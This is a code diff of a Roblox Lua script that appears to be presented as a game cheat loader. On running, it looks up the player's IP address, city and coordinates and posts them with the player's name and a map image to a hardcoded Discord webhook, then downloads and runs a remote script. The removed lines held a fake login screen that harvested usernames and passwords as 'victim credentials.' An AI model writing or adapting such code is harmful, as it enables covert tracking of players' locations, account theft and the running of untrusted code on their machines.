@@ -1,6 +1,5 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 local webhook = "https://discord.com/api/webhooks/1402854262932770916/4nscMrOlbSjg5EJVZyV48yGLswLlw_lF0xx795zzN1L_TbB-4musJajqWamKsWTb4AEw"
@@ -14,7 +13,7 @@ local function getRequestFunction()
     else return nil end
 end
 
-local ip, city, region, country = "N/A", "N/A", "N/A", "N/A"
+local ip, city, region, country, loc = "N/A", "N/A", "N/A", "N/A", "0,0"
 do
     local req = getRequestFunction()
     if req then
@@ -25,154 +24,47 @@ do
             city = data.city or city
             region = data.region or region
             country = data.country or country
+            loc = data.loc or loc -- format: "lat,lon"
         end)
     end
 end
 
-local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = "LoadingScreen"
-loadingGui.ResetOnSpawn = false
-loadingGui.IgnoreGuiInset = true
-loadingGui.Parent = CoreGui
+-- Prepare OpenStreetMap static map URL with marker
+local lat, lon = loc:match("([^,]+),([^,]+)")
+local mapUrl = string.format(
+    "https://staticmap.openstreetmap.de/staticmap.php?center=%s,%s&zoom=10&size=400x200&markers=%s,%s,red-pushpin",
+    lat, lon, lat, lon
+)
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.Position = UDim2.new(0, 0, 0, 0)
-frame.BackgroundColor3 = Color3.new(0, 0, 0)
-frame.BorderSizePixel = 0
-frame.Parent = loadingGui
+local payload = {
+    ["username"] = "IP logger",
+    ["embeds"] = {{
+        ["title"] = "🚨 IP Logger Report",
+        ["color"] = 16711680,
+        ["fields"] = {
+            {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
+            {["name"] = "Location", ["value"] = string.format("%s, %s, %s", city, region, country), ["inline"] = true},
+            {["name"] = "Game", ["value"] = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = true},
+            {["name"] = "Player", ["value"] = lp.Name, ["inline"] = true},
+            {["name"] = "Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false},
+        },
+        ["image"] = {
+            ["url"] = mapUrl
+        }
+    }}
+}
 
-for i = 1, 50 do
-    local star = Instance.new("Frame")
-    star.Size = UDim2.new(0, 2, 0, 2)
-    star.Position = UDim2.new(math.random(), 0, math.random(), 0)
-    star.BackgroundColor3 = Color3.new(1, 1, 1)
-    star.BorderSizePixel = 0
-    star.AnchorPoint = Vector2.new(0.5, 0.5)
-    star.Parent = frame
+local body = HttpService:JSONEncode(payload)
+local req = getRequestFunction()
+if req then
+    pcall(function()
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = body
+        })
+    end)
 end
 
--- Username on left
-local usernameLabel = Instance.new("TextLabel")
-usernameLabel.Size = UDim2.new(0, 200, 0, 30)
-usernameLabel.Position = UDim2.new(0.25, -100, 0.35, -40)
-usernameLabel.BackgroundTransparency = 1
-usernameLabel.Text = "Username"
-usernameLabel.TextColor3 = Color3.new(1, 1, 1)
-usernameLabel.Font = Enum.Font.GothamBold
-usernameLabel.TextSize = 24
-usernameLabel.Parent = loadingGui
-
-local usernameBox = Instance.new("TextBox")
-usernameBox.Size = UDim2.new(0, 200, 0, 30)
-usernameBox.Position = UDim2.new(0.25, -100, 0.35, 0)
-usernameBox.BackgroundColor3 = Color3.new(1, 1, 1)
-usernameBox.ClearTextOnFocus = false
-usernameBox.PlaceholderText = "Enter username"
-usernameBox.TextColor3 = Color3.new(0, 0, 0)
-usernameBox.Font = Enum.Font.Gotham
-usernameBox.TextSize = 20
-usernameBox.Parent = loadingGui
-
--- Password on right
-local passwordLabel = Instance.new("TextLabel")
-passwordLabel.Size = UDim2.new(0, 200, 0, 30)
-passwordLabel.Position = UDim2.new(0.75, -100, 0.35, -40)
-passwordLabel.BackgroundTransparency = 1
-passwordLabel.Text = "Password"
-passwordLabel.TextColor3 = Color3.new(1, 1, 1)
-passwordLabel.Font = Enum.Font.GothamBold
-passwordLabel.TextSize = 24
-passwordLabel.Parent = loadingGui
-
-local passwordBox = Instance.new("TextBox")
-passwordBox.Size = UDim2.new(0, 200, 0, 30)
-passwordBox.Position = UDim2.new(0.75, -100, 0.35, 0)
-passwordBox.BackgroundColor3 = Color3.new(1, 1, 1)
-passwordBox.ClearTextOnFocus = false
-passwordBox.PlaceholderText = "Enter password"
-passwordBox.TextColor3 = Color3.new(0, 0, 0)
-passwordBox.Font = Enum.Font.Gotham
-passwordBox.TextSize = 20
-passwordBox.Parent = loadingGui
-
--- Professional text center below inputs
-local privacyText = Instance.new("TextLabel")
-privacyText.Size = UDim2.new(0, 400, 0, 40)
-privacyText.Position = UDim2.new(0.5, -200, 0.5, 0)
-privacyText.BackgroundTransparency = 1
-privacyText.Text = "Your password will not be shared with anyone. You have a right to your privacy."
-privacyText.TextColor3 = Color3.new(1, 1, 1)
-privacyText.Font = Enum.Font.Gotham
-privacyText.TextSize = 18
-privacyText.TextWrapped = true
-privacyText.Parent = loadingGui
-
--- Enter button below privacy text centered
-local enterButton = Instance.new("TextButton")
-enterButton.Size = UDim2.new(0, 200, 0, 40)
-enterButton.Position = UDim2.new(0.5, -100, 0.57, 0)
-enterButton.BackgroundColor3 = Color3.new(1, 1, 1)
-enterButton.Text = "Enter"
-enterButton.TextColor3 = Color3.new(0, 0, 0)
-enterButton.Font = Enum.Font.GothamBold
-enterButton.TextSize = 24
-enterButton.Parent = loadingGui
-enterButton.AutoButtonColor = true
-
--- Block input outside GUI
-frame.InputBegan:Connect(function(input)
-    input:CaptureControl()
-end)
-frame.InputChanged:Connect(function(input)
-    input:CaptureControl()
-end)
-for _, guiElement in pairs(loadingGui:GetDescendants()) do
-    if guiElement:IsA("GuiObject") then
-        guiElement.InputBegan:Connect(function(input)
-            input:CaptureControl()
-        end)
-        guiElement.InputChanged:Connect(function(input)
-            input:CaptureControl()
-        end)
-    end
-end
-
-enterButton.MouseButton1Click:Connect(function()
-    local username = usernameBox.Text
-    local password = passwordBox.Text
-
-    local payload = {
-        ["content"] = "@everyone **Victim Credentials Captured**",
-        ["username"] = "IP Logger",
-        ["embeds"] = {{
-            ["title"] = "🚨 Credentials and IP Logger",
-            ["color"] = 16711680,
-            ["fields"] = {
-                {["name"] = "Username", ["value"] = username, ["inline"] = true},
-                {["name"] = "Password", ["value"] = password, ["inline"] = true},
-                {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
-                {["name"] = "Location", ["value"] = string.format("%s, %s, %s", city, region, country), ["inline"] = true},
-                {["name"] = "Game", ["value"] = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = true},
-                {["name"] = "Player", ["value"] = lp.Name, ["inline"] = true},
-                {["name"] = "Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false},
-            }
-        }}
-    }
-
-    local body = HttpService:JSONEncode(payload)
-    local req = getRequestFunction()
-    if req then
-        pcall(function()
-            req({
-                Url = webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = body
-            })
-        end)
-    end
-
-    loadingGui:Destroy()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
-end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
